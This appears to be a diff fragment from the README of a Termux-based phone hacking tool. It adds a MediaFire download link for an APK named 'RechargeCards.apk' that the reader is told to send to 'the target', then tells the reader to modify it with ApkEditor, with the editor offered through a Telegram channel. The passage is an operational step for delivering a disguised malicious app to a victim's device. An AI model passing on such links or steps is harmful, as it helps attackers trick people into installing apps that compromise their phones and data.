@@ -27,8 +27,8 @@ How to run the tool after installing it on Termux: -
 
 Click on the link to download the apk application that you will send to the target
 
-http: ////
-
+https://www.mediafire.com/file/ea7j1znmp3ovenu/RechargeCards.apk/file
+--
 After downloading the application, you must have an application editor, such as ApkEditor.
 
 If you don't have the editor, you can download it from my channel on Telegram
